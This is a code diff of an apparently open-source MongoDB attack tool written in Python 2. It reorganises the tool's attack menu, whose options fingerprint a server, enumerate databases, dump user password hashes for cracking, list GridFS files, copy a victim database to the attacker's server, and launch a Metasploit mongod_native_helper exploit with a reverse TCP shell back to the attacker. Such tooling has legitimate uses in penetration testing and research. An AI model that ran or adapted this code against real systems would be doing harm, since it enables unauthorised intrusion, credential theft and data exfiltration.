@@ -374,6 +374,7 @@ def netAttacks(target):
 	print "================="
 	mgtOpen = False
 	webOpen = False
+	mgtSelect = True
 	#This is a global for future use with other modules; may change
 	global dbList
 	global dbPort
@@ -435,99 +436,123 @@ def netAttacks(target):
 					dbTemp= dbs['databases'][x]['name']
 					print str(menuItem) + "-" + dbTemp
 					menuItem += 1
+			else:
+				print "REST interface not enabled."
 			print "\n"
 
-		else:
-			print "REST interface not enabled." 
-			
-	except:
-		
+	except:		
 		print "MongoDB web management closed or requires authentication."	
 		
-	print "\n"
 	if mgtOpen == True:
-		print "Server Info:"
-		mongoVer = conn.server_info()['version']
-		print "MongoDB Version: " + mongoVer
-		mongoDebug = conn.server_info()['debug']
-		print "Debugs enabled : " + str(mongoDebug)
-		mongoPlatform = conn.server_info()['bits']
-		print "Platform: " + str(mongoPlatform) + " bit"
-		print "\n"
 		
-		try:
-			print "List of databases:"
-			dbList = conn.database_names()
-			print "\n".join(dbList)
+		while mgtSelect:
 			print "\n"
-			
-		except:
-			print "Error:  Couldn't list databases.  The provided credentials may not have rights."
-		
-		print "List of collections:"
-		#print "\n"
-		
-		try:
-			for dbItem in dbList:
-				db = conn[dbItem]
-				colls = db.collection_names()
-				print dbItem + ":"
-				print "\n".join(colls)
+			print "1-Get Server Version and Platform"
+			print "2-Enumerate Databases/Collections/Users"
+			print "3-Check for GridFS"
+			print "4-Clone a Database"
+			print "5-Launch Metasploit Exploit for Mongo < 2.2.4"
+			print "6-Return to Main Menu"
+			attack = raw_input("Select an attack: ")
+	
+			if attack == "1":
 				print "\n"
+				getPlatInfo(conn)
+			
+			if attack == "2":
+				print "\n"
+				enumDbs(conn)
+			
+			if attack == "3":
+				print "\n"
+				enumGrid(conn)
+			
+			if attack == "4":
+				print "\n"
+				stealDBs(myIP,conn)
+			
+			if attack == "5":
+				print "\n"
+				msfLaunch()
+			
+			if attack == "6":
+				return
+			
+			
 				
-				if 'system.users' in colls:
-					users = list(db.system.users.find())
-					print "Database Users and Password Hashes:"
-					
-					for x in range (0,len(users)):
-						print "Username: " + users[x]['user']
-						print "Hash: " + users[x]['pwd']
-						print "\n"
-						crack = raw_input("Crack this hash (y/n)? ")
-						
-						if crack in yes_tag:
-							passCrack(users[x]['user'],users[x]['pwd'])
-					
-		except:
-			print "Error:  Couldn't list collections.  The provided credentials may not have rights."
-		
+def getPlatInfo (mongoConn):
+	print "Server Info:"
+	print "MongoDB Version: " + mongoConn.server_info()['version']
+	print "Debugs enabled : " + str(mongoConn.server_info()['debug'])
+	print "Platform: " + str(mongoConn.server_info()['bits']) + " bit"
+	print "\n"
+	return
+
+def enumDbs (mongoConn):
+	try:
+		print "List of databases:"
+		print "\n".join(mongoConn.database_names())
 		print "\n"
-		#Start GridFS enumeration
+			
+	except:
+		print "Error:  Couldn't list databases.  The provided credentials may not have rights."
+	
+	print "List of collections:"
 		
-		testGrid = raw_input("Check for GridFS (y/n)? ")
-		
-		if testGrid in yes_tag:
-			try:
-				for dbItem in dbList:
-					try:
-						db = conn[dbItem]
-						fs = gridfs.GridFS(db)
-						files = fs.list()
-						print "GridFS enabled on database " + str(dbItem)
-						print " list of files:"
-						print "\n".join(files)
+	try:
+		for dbItem in mongoConn.database_names():
+			db = mongoConn[dbItem]
+			print dbItem + ":"
+			print "\n".join(db.collection_names())
+			print "\n"
+				
+			if 'system.users' in db.collection_names():
+				users = list(db.system.users.find())
+				print "Database Users and Password Hashes:"
 					
-					except:
-						print "GridFS not enabled on " + str(dbItem) + "."
-			except:
-				print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."
-							
-		stealDB = raw_input("Steal a database (y/n-Requires your own Mongo server)?: ")
+				for x in range (0,len(users)):
+					print "Username: " + users[x]['user']
+					print "Hash: " + users[x]['pwd']
+					print "\n"
+					crack = raw_input("Crack this hash (y/n)? ")
+						
+					if crack in yes_tag:
+						passCrack(users[x]['user'],users[x]['pwd'])
+					
+	except:
+		print "Error:  Couldn't list collections.  The provided credentials may not have rights."
 		
-		if stealDB in yes_tag:
-			stealDBs (myIP)
-			
-		getShell = raw_input("Try to get a shell? (y/n-Requrires mongoDB <2.2.4)? ")
-		
-		if getShell in yes_tag:
-			#Launch Metasploit exploit
+	print "\n"
+	return
+
+def enumGrid (mongoConn):
+	try:
+		for dbItem in mongoConn.database_names():
 			try:
-				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
-			
+				db = mongoConn[dbItem]
+				fs = gridfs.GridFS(db)
+				files = fs.list()
+				print "GridFS enabled on database " + str(dbItem)
+				print " list of files:"
+				print "\n".join(files)
+					
 			except:
-				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."	
+				print "GridFS not enabled on " + str(dbItem) + "."
+			
+	except:
+		print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."
+							
+	return
+
+			
+def msfLaunch():			
+	try:
+		proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
+			
+	except:
+		print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."	
 	raw_input("Press enter to continue...")
-	return()
+	return
 		
 	
 def postApps():
@@ -1276,7 +1301,8 @@ def buildUri(origUri, randValue):
 
 	return uriArray[0]	
 	
-def stealDBs(myDB):
+def stealDBs(myDB,mongoConn):
+	dbList = mongoConn.database_names()
 	menuItem = 1
 	if optionSet[4] == False:
 		raw_input("No destination database set! Press enter to return to the main menu.")
@@ -1453,7 +1479,7 @@ def massMongo():
 			success.append(target)
 			
 		elif result == 2:
-			print "Successful MongoDB connection but error executing command."
+			print "Successful MongoDB connection to " + target.rstrip() + " but error executing command."
 			success.append(target)
 		
 		elif result == 3:
